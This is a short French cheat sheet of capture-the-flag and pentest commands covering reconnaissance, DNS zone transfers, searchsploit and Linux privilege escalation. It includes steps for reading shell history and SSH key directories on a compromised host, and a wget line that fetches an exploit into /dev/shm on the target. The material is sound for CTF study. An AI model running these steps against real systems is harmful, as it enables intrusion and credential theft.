# Capture The Flag

> Migration vers `pentest.md` en cours

- [Reconnaissance](#reconnaissance)
- [DNS](#dns)
- [Vulnérabilités](#vulnérabilités)
- [Local Privilege Escalation](#local-privilege-escalation)
- [SQLite](#sqlite)

---

Liens :
- https://attack.mitre.org/matrices
- https://www.thehacker.recipes

Départ :
- commencer par brancher le câble réseau 😉
- lancer Wireshark pour observer ce qu'il se passe sur la ligne
- s'assigner une IP sur le même réseau

## Reconnaissance

De manière générale :
- remarquer les versions

Si t'obtiens un accès sur un linux/windows :
- regarder l'historique des commandes
- regarder dans `$HOME/.ssh/`
- regarder la table ARP (pour découvrir des hôtes sans faire de scan)
- regarder les routes pour découvrir d'autres réseaux

Sur Linux :
```bash
history
find /root /home -name *history*

find {/root,/home/*}/.ssh

ip n
ip -br a; echo; ip r
```

Sur Windows :
```powershell
ipconfig -all
arp -a
route
```

## DNS

Si on a trouvé un serveur DNS :
```bash
echo 'nameserver <ip>' >> /etc/resolv.conf
```

Voir tous les enregistrements d'un domaine :
```bash
host -a example.com
```

Mapper un domaine : https://dnsdumpster.com

Pour faire un transfert de zone :
```bash
dig AXFR domain.name @192.168.1.53
```

## Vulnérabilités

Pour chercher des vulnérabilités :
- https://www.exploit-db.com
- https://nvd.nist.gov/vuln/search

ou la commande `searchsploit`:
```bash
# pour chercher (case insensitive AND)
searchsploit cutenews
# lire l'exploit
searchsploit -x <filename>
# copier l'exploit dans le CWD
searchsploit -m <filename>
```

## Local Privilege Escalation

Sur la machine cible :
```bash
# obtenir la version du noyau Linux
uname -a

# télécharger l'exploit (et le stocker en RAM)
wget URL > /dev/shm/lpe
```

## SQLite

```bash
sqlitebrowser fichier.sqlite
```
